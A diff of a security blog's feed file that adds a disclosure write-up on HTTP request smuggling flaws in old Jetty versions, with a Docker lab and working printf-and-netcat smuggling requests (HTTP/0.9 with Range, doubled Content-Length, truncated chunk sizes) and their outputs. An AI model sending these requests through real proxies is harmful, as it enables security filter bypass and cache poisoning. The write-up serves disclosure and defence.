@@ -6,6 +6,401 @@
 		<link>http://regilero.github.io</link>
 		
 			<item>
+				<title>Security: HTTP Smuggling, Jetty</title>
+				<description>&lt;p&gt;&lt;small&gt;&lt;strong&gt;English version&lt;/strong&gt; (&lt;strong&gt;Version Française&lt;/strong&gt; sur &lt;a href=&quot;https://www.makina-corpus.com/blog/metier/2019/contrebande-de-http-http-smuggling-jetty&quot;&gt;makina corpus&lt;/a&gt;).&lt;/small&gt;
+&lt;small&gt;estimated read time: 15min&lt;/small&gt;&lt;/p&gt;
+
+&lt;h2&gt;Jetty?&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://www.eclipse.org/jetty&quot;&gt;Jetty&lt;/a&gt; is a JAVA HTTP sever, but not only, it&#39;s also for example a Java servlet server. If you do not know it I think we could compare it to Tomcat. Jetty is a very lightweight part and you can find it &lt;a href=&quot;http://www.eclipse.org/jetty/powered/powered.html&quot;&gt;in a lot of projects&lt;/a&gt;.
+For the part we are concerned with it&#39;s the &lt;strong&gt;HTTP server&lt;/strong&gt; which is interesting. Subject of the day is once again HTTP Smuggling, for defects which were reported by us last year (and fixed by the project maintainer a few days after the report).&lt;/p&gt;
+
+&lt;h2&gt;Jetty fixed versions&lt;/h2&gt;
+
+&lt;p&gt;If you use Jetty in your projects you should ensure your version is greater than :&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;9.2.x : &lt;strong&gt;9.2.25v20180606&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;9.3.x : &lt;strong&gt;9.3.24.v20180605&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;9.4.x : &lt;strong&gt;9.4.11.v20280605&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;not talking about previous versions, before the 9.x, not maintained anymore.&lt;/li&gt;
+&lt;/ul&gt;
+
+
+&lt;p&gt;The flaws were disclosed almost one year ago, so if you still have a version older than the listed ones you should really take some time and upgrade.&lt;/p&gt;
+
+&lt;h2&gt;The flaws (a summary)&lt;/h2&gt;
+
+&lt;p&gt;The 3 CVEs refers to somewhat classical flaws (in this specific domain). We are talking about misinterpretation of some syntax limits. Things that should usually trigger errors, but in this case you do not have the errors.&lt;/p&gt;
+
+&lt;p&gt;In this article I&#39;ll look more specifically at some original flaws, like the HTTP/0.9 or the truncation on chunk size attribute. But it you take a look at the CVE descriptions you can see that several other flaws were also present.&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2017-7656&quot;&gt;CVE-2017-7656&lt;/a&gt; CVSS v3: 7.5 HIGH CVSS v2: 5.0 MEDIUM :&lt;/li&gt;
+&lt;/ul&gt;
+
+
+&lt;blockquote&gt;&lt;p&gt;In Eclipse Jetty, versions 9.2.x and older, 9.3.x (all configurations), and 9.4.x
+(non-default configuration with RFC2616 compliance enabled), HTTP/0.9 is handled
+poorly. An HTTP/1 style request line (i.e. method space URI space version) that
+declares a version of HTTP/0.9 was accepted and treated as a 0.9 request.
+If deployed behind an intermediary that also accepted and passed through the 0.9
+version (but did not act on it), then the response sent could be interpreted by
+the intermediary as HTTP/1 headers. This could be used to poison the cache if the
+server allowed the origin client to generate arbitrary content in the response.&lt;/p&gt;&lt;/blockquote&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2017-7657&quot;&gt;CVE-2017-7657&lt;/a&gt; CVSS v3: 7.5 HIGH CVSS v2: 5.0 MEDIUM :&lt;/li&gt;
+&lt;/ul&gt;
+
+
+&lt;blockquote&gt;&lt;p&gt;In Eclipse Jetty, versions 9.2.x and older, 9.3.x (all configurations), and 9.4.x
+(non-default configuration with RFC2616 compliance enabled), transfer-encoding
+chunks are handled poorly. The chunk length parsing was vulnerable to an integer
+overflow. Thus a large chunk size could be interpreted as a smaller chunk size and
+content sent as chunk body could be interpreted as a pipelined request. If Jetty
+was deployed behind an intermediary that imposed some authorization and that
+intermediary allowed arbitrarily large chunks to be passed on unchanged, then this
+flaw could be used to bypass the authorization imposed by the intermediary as the
+fake pipelined request would not be interpreted by the intermediary as a request.&lt;/p&gt;&lt;/blockquote&gt;
+
+&lt;p&gt;If you previously read some of my HTTP smuggling posts this is quite classical, you&#39;ll note the authentication bypass which is only one of the various attacks that smuggling allows, but for a chunk size number truncation it may be the only type of exploitation available.&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2017-7658&quot;&gt;CVE-2017-7658&lt;/a&gt; CVSS v3: 9.8 CRITICAL CVSS v2: 7.5 HIGH :&lt;/li&gt;
+&lt;/ul&gt;
+
+
+&lt;blockquote&gt;&lt;p&gt;In Eclipse Jetty Server, versions 9.2.x and older, 9.3.x (all non HTTP/1.x
+configurations), and 9.4.x (all HTTP/1.x configurations), when presented with two
+content-lengths headers, Jetty ignored the second. When presented with a
+content-length and a chunked encoding header, the content-length was ignored
+(as per RFC 2616). If an intermediary decided on the shorter length, but still
+passed on the longer body, then body content could be interpreted by Jetty as a
+pipelined request. If the intermediary was imposing authorization, the fake
+pipelined request would bypass that authorization.&lt;/p&gt;&lt;/blockquote&gt;
+
+&lt;p&gt;You can see that&#39;s this is the &lt;strong&gt;more severe flaw&lt;/strong&gt; in terms of security. But it&#39;s somewhat classical. We&#39;ll certainly find details about this type of attacks on future posts so I wont talk too much about that. This is the oldest flaws (first public work dating 2005) about multiple headers interpreted diffently by various actors. The modern RFC for HTTP expect rejection of such messages.&lt;/p&gt;
+
+&lt;h2&gt;Building a test lab&lt;/h2&gt;
+
+&lt;p&gt;If you want to see the bugs you need some old versions of Jetty, and you need to perform HTTP request on that with netcat + printf commands as shown below. To build this lab the simpliest method is Docker.&lt;/p&gt;
+
+&lt;p&gt;Here is a working Dockerfile :&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;FROM jetty:9.4.9
+RUN mkdir /var/lib/jetty/webapps/root
+RUN bash -c &#39;set -ex \
+  &amp;amp;&amp;amp; cd /var/lib/jetty/webapps/root \
+  &amp;amp;&amp;amp; wget https://tomcat.apache.org/tomcat-7.0-doc/appdev/sample/sample.war \
+  &amp;amp;&amp;amp; unzip sample.war&#39;
+EXPOSE 8080
+ENTRYPOINT [&quot;/docker-entrypoint.sh&quot;]
+CMD [&quot;java&quot;,&quot;-jar&quot;,&quot;/usr/local/jetty/start.jar&quot;]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Let&#39;s build it an run it, go in the folder containing the previous Dockerfile :&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;docker build -t jetty9_4_9 .
+docker run --name dockerjetty9_4_9 -p 8994:8080 -d jetty9_4_9
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;You should obtain this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;$ docker ps
+CONTAINER ID        IMAGE               COMMAND                     CREATED             STATUS              PORTS                    NAMES
+aa59d97778f1        jetty9_4_9          &quot;/docker-entrypoint(...)&quot;   3 seconds ago       Up 2 seconds        0.0.0.0:8994-&amp;gt;8080/tcp   dockerjetty9_4_9
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;You Jetty is available on 127.0.0.1:8994&lt;/p&gt;
+
+&lt;h2&gt;Interesting details&lt;/h2&gt;
+
+&lt;p&gt;I&#39;ll skip the small details on spacing and pseudo-spacing errors on request start, special characters allowed on the wrong places, etc. Let&#39;s look at the really &lt;em&gt;funny&lt;/em&gt; stuff.&lt;/p&gt;
+
+&lt;h3&gt;HTTP/0.9&lt;/h3&gt;
+
+&lt;p&gt;HTTP 0.9 syntax is  :&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;GET /path/to/resource\r\n
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;There is &lt;strong&gt;no&lt;/strong&gt; protocol version as in :&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;GET /path/to/resource HTTP/0.9\r\n
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Et we should &lt;strong&gt;not&lt;/strong&gt; have headers after this first line as in :&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;GET /path/to/resource HTTP/0.9\r\n
+Range: bytes=5-18\r\n
+\r\n
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;An HTTP/0.9 response does not contain any meta-information (no header, no content-type, no size).&lt;/p&gt;
+
+&lt;p&gt;In jetty there is normally no support for request in 0.9  version. You can make a test on you docker (which is listening on port 8994), typing &lt;code&gt;printf &#39;GET /?test=4564\r\n&#39;|nc -q 1 127.0.0.1 8994\r\n&lt;/code&gt; (you need nc, also named netcat).&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ printf &#39;GET /?test=4564\r\n&#39;\
+&amp;gt; |nc -q 1 127.0.0.1 8994
+HTTP/1.1 400 HTTP/0.9 not supported
+Content-Type: text/html;charset=iso-8859-1
+Content-Length: 65
+Connection: close
+Server: Jetty(9.4.9.v20180320)
+
+&amp;lt;h1&amp;gt;Bad Message 400&amp;lt;/h1&amp;gt;&amp;lt;pre&amp;gt;reason: HTTP/0.9 not supported&amp;lt;/pre&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If you redo another test leb with a Jetty 9.2 you&#39;ll see that we still had support for HTTP 0.9 using a valid syntax.&lt;/p&gt;
+
+&lt;p&gt;Until now no problem. But let&#39;s add a part with protocol declaration in our line with &lt;code&gt;HTTP/0.9&lt;/code&gt;, which is forbidden :&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;printf &#39;GET /?test=4564 HTTP/0.9\r\n&#39;\
+&#39;\r\n&#39;\
+|nc -q 1 127.0.0.1 8994&amp;lt;html&amp;gt;
+
+&amp;lt;head&amp;gt;
+&amp;lt;title&amp;gt;Sample &quot;Hello, World&quot; Application&amp;lt;/title&amp;gt;
+&amp;lt;/head&amp;gt;
+&amp;lt;body bgcolor=white&amp;gt;
+
+&amp;lt;table border=&quot;0&quot;&amp;gt;
+&amp;lt;tr&amp;gt;
+(...)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Here Jetty is responding with a 0.9 response, &lt;strong&gt;no headers&lt;/strong&gt;, just a body.&lt;/p&gt;
+
+&lt;p&gt;We are starting to have some &lt;strong&gt;security problems&lt;/strong&gt;. An actor present in the HTTP transmission chain will not consider &lt;code&gt;HTTP/0.9&lt;/code&gt; as a valid HTTP v0.9 syntax and could read the response as an HTTP/1.0 or HTTP/1.1 response.&lt;/p&gt;
+
+&lt;p&gt;Let&#39;s add another problem which renders this pseudo support really ... problematic, &lt;strong&gt;headers from the request are read and interpreted&lt;/strong&gt;. They should not, there&#39;re no headers in v0.9.&lt;/p&gt;
+
+&lt;p&gt;We add a &lt;code&gt;range&lt;/code&gt; header to check if the requets can extract any subpart of the response :&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;printf &#39;GET /?test=4564 HTTP/0.9\r\n&#39;\
+&#39;Range: bytes=36-42\r\n&#39;\
+&#39;\r\n&#39;\
+|nc -q 1 127.0.0.1 8994
+
+, World
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;Victory&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;This means we can use a request which is not officially an HTTP/0.9 request (as we have a wrong protocol version &lt;code&gt;HTTP/0.9&lt;/code&gt; part inside), with header support, and that we can choose quite easily the part of the response that will be returned, without headers added by the HTTP server. The idea beside this, to exploit the flaws, is to extract a fake HTTP/1.0 or HTTP/1.1 response, hidden for example in an image.&lt;/p&gt;
+
+&lt;p&gt;If an invalid HTTP/0.9 request is sent through a Reverse Proxy (which does not detect it as an 0.9 query), the response could be interpreted as a valid HTTP/1.1 response if the response content looks like HTTP/1.1 protocol.&lt;/p&gt;
+
+&lt;p&gt;You can hide a complete HTTP response (headers + body) in the EXIF data of an image, extract this section with a range query, and use this data chunk as a valid HTTP/1.1 response. If you look at the second example in &lt;a href=&quot;https://www.youtube.com/watch?v=lY_Mf2Fv7kI&quot;&gt;this video&lt;/a&gt; it was the effect obtained on golaong. You&#39;ll just need the ability to upload the file containing this response on the server, and a Reverse proxy  support this HTTP/0.9.&lt;/p&gt;
+
+&lt;h3&gt;Double Content-Length&lt;/h3&gt;
+
+&lt;p&gt;We&#39;ll do it fast, this is a request splitting attack, in some specific configurations you can obtain two answers by doubling the Content-Length header. Doubling it is strictly forbidden, because when you do it we cannot known which header is the right one to read to evaluate the body size, it depends on the actor interpreting the HTTP stream.&lt;/p&gt;
+
+&lt;p&gt;First problem, on version 9.2 it was still allowed to use two &quot;Content-Length&quot; headers. On versions 9.3 and 9.4 it was harder, but if the &lt;strong&gt;first header value is 0&lt;/strong&gt; this was still allowed.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Rejected:
+    Content-Length: 200\r\n
+    Content-Length: 99\r\n
+Rejected:
+    Content-Length: 200\r\n
+    Content-Length: 200\r\n
+Rejected:
+    Content-Length: 0\r\n
+    Content-Length: 200\r\n
+    Content-Length: 0\r\n
+Rejected:
+    Content-Length: 0\r\n
+    Content-Length: 99\r\n
+    Content-Length: 200\r\n
+Rejected:
+    Content-Length: 200\r\n
+    Content-Length: 0\r\n
+Accepted:
+    Content-Length: 0\r\n
+    Content-Length: 200\r\n
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Exemple in the lab:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;printf &#39;GET /?test=4966 HTTP/1.1\r\n&#39;\
+&#39;Host: localhost\r\n&#39;\
+&#39;Connection: keepalive\r\n&#39;\
+&#39;Content-Length: 45\r\n&#39;\
+&#39;Content-Length: 0\r\n&#39;\
+&#39;\r\n&#39;\
+&#39;GET /?test=4967 HTTP/1.1\r\n&#39;\
+&#39;Host: localhost\r\n&#39;\
+&#39;\r\n&#39;\
+|nc -q 1 127.0.0.1 8994 | grep &quot;HTTP&quot;
+
+HTTP/1.1 400 Duplicate Content-Length
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Here it was a nice rejection, that&#39;s OK.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;printf &#39;GET /?test=4968 HTTP/1.1\r\n&#39;\
+&#39;Host: localhost\r\n&#39;\
+&#39;Connection: keepalive\r\n&#39;\
+&#39;Content-Length: 0\r\n&#39;\
+&#39;Content-Length: 45\r\n&#39;\
+&#39;\r\n&#39;\
+&#39;GET /?test=4969 HTTP/1.1\r\n&#39;\
+&#39;Host: localhost\r\n&#39;\
+&#39;\r\n&#39;\
+|nc -q 1 127.0.0.1 8994 | grep &quot;HTTP&quot;
+
+HTTP/1.1 200 OK
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And then no rejection. You could say &quot;there&#39;s no splitting, we have only one response&quot;. The problem in fact is that the only good response is to &lt;strong&gt;reject&lt;/strong&gt; the message.
+Let&#39;s imagine that we use a longer pipeline :&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;printf &#39;GET /?test=4970 HTTP/1.1\r\n&#39;\
+&#39;Host: localhost\r\n&#39;\
+&#39;Connection: keepalive\r\n&#39;\
+&#39;Content-Length: 0\r\n&#39;\
+&#39;Content-Length: 45\r\n&#39;\
+&#39;\r\n&#39;\
+&#39;GET /?test=4971 HTTP/1.1\r\n&#39;\
+&#39;Host: localhost\r\n&#39;\
+&#39;\r\n&#39;\
+&#39;GET /?test=4972 HTTP/1.1\r\n&#39;\
+&#39;Host: localhost\r\n&#39;\
+&#39;\r\n&#39;\
+|nc -q 1 127.0.0.1 8994 | grep &quot;HTTP&quot;
+
+HTTP/1.1 200 OK
+HTTP/1.1 200 OK
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;We have &lt;strong&gt;two responses&lt;/strong&gt;, but if we go through another actor which also forgot to reject the invalid message, this actor could interpret this pipeline as three queries and expect three responses instead of two (as there&#39;s no good way of choosing which Content-Length header is the right one). So this would start a response mix, and that&#39;s not good at all.&lt;/p&gt;
+
+&lt;p&gt;This is in fact one of the key point of HTTP Smuggling, bif problems always comes when several issues, on several actors, are combined together to generate chaos.&lt;/p&gt;
+
+&lt;h3&gt;Chunk size attribute truncation&lt;/h3&gt;
+
+&lt;p&gt;You may have detected in the previous examples my usage of grep at the end of the command. That&#39;s not required, it&#39;s just a way to detect faster the number of responses received by the test.&lt;/p&gt;
+
+&lt;p&gt;To change things I&#39;ll start directly with the test :&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;printf &#39;POST /?test=4973 HTTP/1.1\r\n&#39;\
+&#39;Transfer-Encoding: chunked\r\n&#39;\
+&#39;Content-Type: application/x-www-form-urlencoded\r\n&#39;\
+&#39;Host: localhost\r\n&#39;\
+&#39;\r\n&#39;\
+&#39;100000000\r\n&#39;\
+&#39;\r\n&#39;\
+&#39;POST /?test=4974 HTTP/1.1\r\n&#39;\
+&#39;Content-Length: 5\r\n&#39;\
+&#39;Host: localhost\r\n&#39;\
+&#39;\r\n&#39;\
+&#39;\r\n&#39;\
+&#39;0\r\n&#39;\
+&#39;\r\n&#39;\
+|nc -q 1 127.0.0.1 8994|grep &quot;HTTP/1.1&quot;
+
+HTTP/1.1 200 OK
+HTTP/1.1 200 OK
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Result is &lt;strong&gt;two responses&lt;/strong&gt;. But did we really had two requests ?&lt;/p&gt;
+
+&lt;p&gt;In what looks like the first request we announc &lt;code&gt;Transfer-Encoding: chunked&lt;/code&gt;. It means we ignore anything related to Content-Length for body size calculation, we&#39;ll use chunks of data and an end-of-chunks marker to mark the end of the body. So we should get something like that in the request body :&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;5\r\n
+xxxxxx\r\n
+5\r\n
+\r\n
+xxxxxx\r\n
+0\r\n
+\r\n
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;That is :&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;size of 1st chunk in hexa&amp;gt;\r\n
+xxxxxx&amp;lt;chunk content&amp;gt;xxxxx\r\n
+&amp;lt;size of 2nd chunk in hexa&amp;gt;\r\n
+xxxxxx&amp;lt;chunk content&amp;gt;xxxxx\r\n
+&amp;lt;size 0, dlast chunk, end of transmission&amp;gt;\r\n
+\r\n
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Our first request tells us, in hexa, a huge chunk with a size of 1000000000 (for decimal value I&#39;ll let you compute it, but really this is very huge). And we can understand that Jetty saw that as a &#39;0&#39;, so a last chunk marker, and &lt;code&gt;POST /?test=4974&lt;/code&gt; and all the following stuff has become a request, it was in reality just some garbage body data that the HTTP parser must not interpret.&lt;/p&gt;
+
+&lt;p&gt;Let&#39;s look at a second example :&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;printf &#39;POST /?test=4975 HTTP/1.1\r\n&#39;\
+&#39;Transfer-Encoding: chunked\r\n&#39;\
+&#39;Content-Type: application/x-www-form-urlencoded\r\n&#39;\
+&#39;Host: localhost\r\n&#39;\
+&#39;\r\n&#39;\
+&#39;1ff00000008\r\n&#39;\
+&#39;abcdefgh\r\n&#39;\
+&#39;\r\n&#39;\
+&#39;0\r\n&#39;\
+&#39;\r\n&#39;\
+&#39;POST /?test=4976 HTTP/1.1\r\n&#39;\
+&#39;Content-Length: 5\r\n&#39;\
+&#39;Host: localhost\r\n&#39;\
+&#39;\r\n&#39;\
+&#39;\r\n&#39;\
+&#39;0\r\n&#39;\
+&#39;\r\n&#39;\
+|nc -q 1 127.0.0.1 8994|grep &quot;HTTP/1.1&quot;
+
+HTTP/1.1 200 OK
+HTTP/1.1 200 OK
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Two responses again, &lt;code&gt;1ff00000008&lt;/code&gt; was interpreted as a &lt;code&gt;8&lt;/code&gt; and only &lt;code&gt;abcdefgh&lt;/code&gt; was used for the body.&lt;/p&gt;
+
+&lt;p&gt;Solution of this mistery is that Jetty is (was) only taking the last 8 bytes of the &lt;em&gt;chunk size&lt;/em&gt; attribute (that looks a lot like the CVE-2015-3183 Apache issue that we found years ago, but the truncation was on the first bytes, not the last ones, and on more than 30 bytes) :&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;ffffffffffff00000000\r\n
+            ^^^^^^^^
+            00000000 =&amp;gt; size 0
+
+1ff00000008\r\n
+   ^^^^^^^^
+   00000008 =&amp;gt; size 8
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;An HTTP server can say that such huge attribute for &#39;size of chunk&#39; is too big, and can then emit an HTTP error (like an error 400), but truncating the attribute used to compute the size of the bdoy is very dangerous. Here an attack would use a Reverse Proxy transmiting the chunks without rewriting it (that&#39;s a quite common case), and that would still be forwarding the arbitrary data of the first chunk, (with an unterminated request the reverse proxy is expecting several thousands of TeraBytes in input, that&#39;s what the client is announcing). On the Jetty side we would have ended the first query long ago, starting to handle the next requests in the pipeline that no-one saw before (in the previous example the &lt;code&gt;POST /?test=4976&lt;/code&gt;). Then sending a second response.&lt;/p&gt;
+
+&lt;p&gt;From the various tests I made, Reverse Proxies does not like receiving responses as they still transfer data for the first request, and if they did not cut the communication at this precise moment they would still cut the communication when a second response is received. The issue is that this second request could be a forbidden request. The security filters that could exists in these Reverse proxies, WAF, load balancers, did not detect this second query, that&#39;s a &lt;strong&gt;security filter bypass&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Currently I do not see any other exploitation available, but someone with a creative mind may find a new one.&lt;/p&gt;
+
+&lt;p&gt;Next time we&#39;ll talk about &lt;strong&gt;Apache Traffic Server&lt;/strong&gt;, with a lot more lab manipulations for the people which expect to train themselves on playing with requests using limits of the protocol.&lt;/p&gt;
+
+&lt;h2&gt;Timeline&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;15 mai 2018: security report sent&lt;/li&gt;
+&lt;li&gt;25 juin 2018: &lt;a href=&quot;https://www.eclipse.org/lists/jetty-announce/msg00123.html&quot;&gt;official public announce&lt;/a&gt; by the project&lt;/li&gt;
+&lt;li&gt;avril 2019: this page&lt;/li&gt;
+&lt;/ul&gt;
+
+
+&lt;h2&gt;See also&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;http://regilero.github.io/security/english/2015/10/04/http_smuggling_in_2015_part_one/&quot;&gt;basics of HTTP Smuggling&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;[Pound SSl terminator smuggling issues] (http://regilero.github.io/security/english/2018/07/03/security_pound_http_smuggling/)&lt;/li&gt;
+&lt;li&gt;Video &lt;a href=&quot;https://www.youtube.com/watch?v=dVU9i5PsMPY&quot;&gt;Defcon HTTP Smuggling&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEFCON-24-Regilero-Hiding-Wookiees-In-Http.pdf&quot;&gt;Defcon support&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Video &lt;a href=&quot;https://www.youtube.com/watch?v=lY_Mf2Fv7kI&quot;&gt;Defcon demos&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+</description>
+				<published>2019-04-24 00:00:00 +0200</published>
+				<link>http://regilero.github.io/english/security/2019/04/24/security_jetty_http_smuggling/</link>
+			</item>
+		
+			<item>
 				<title>Security: HTTP Smuggling, Apsis Pound load balancer</title>
 				<description>&lt;p&gt;&lt;small&gt;&lt;strong&gt;English version&lt;/strong&gt; (&lt;strong&gt;Version Française&lt;/strong&gt; disponible sur &lt;a href=&quot;https://www.makina-corpus.com/blog/metier/2018/contrebande-de-http-smuggling-load-balancer-apsis-pound&quot;&gt;makina corpus&lt;/a&gt;).&lt;/small&gt;
 &lt;small&gt;estimated read time: 15min&lt;/small&gt;&lt;/p&gt;
@@ -135,7 +530,7 @@ chunked transmission has the priority on any Content-Length headers.&lt;/p&gt;
 &lt;/ul&gt;
 
 
-&lt;p&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# 2 responses instead of 3&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# 2 responses instead of 3&lt;/span&gt;
 &lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET / HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;Content-length:56\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
@@ -151,7 +546,8 @@ chunked transmission has the priority on any Content-Length headers.&lt;/p&gt;
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy:Header\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; nc -q3 127.0.0.1 8080&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; nc -q3 127.0.0.1 8080&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
 
 &lt;p&gt;For a &lt;strong&gt;valid parser&lt;/strong&gt; there are 3 queries:&lt;/p&gt;
 
@@ -218,7 +614,7 @@ but sometimes the parser does not detect the NULL character because the parsed l
 
 &lt;p&gt;With Pound as soon as a NULL character was encountered in an header line the parser would continue the header with the next line.&lt;/p&gt;
 
-&lt;p&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# 2 responses instead of 3 (2nd query is wipped out by pound, used as a body)&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# 2 responses instead of 3 (2nd query is wipped out by pound, used as a body)&lt;/span&gt;
 &lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET / HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;Content-\0dummy: foo\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
@@ -236,13 +632,14 @@ but sometimes the parser does not detect the NULL character because the parsed l
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy:Header\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; nc -q3 127.0.0.1 8080&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; nc -q3 127.0.0.1 8080&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
 
 &lt;p&gt;Here is another variation using the Double Content-length Support. This could be
 used if the previous actor in the chain of proxies had no support for double
 Content-Length (very likely).. but had support for NULL characters (less likely).&lt;/p&gt;
 
-&lt;p&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# 2 responses instead of 3 (2nd query is wipped out by pound, used as a body)&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# 2 responses instead of 3 (2nd query is wipped out by pound, used as a body)&lt;/span&gt;
 &lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET / HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
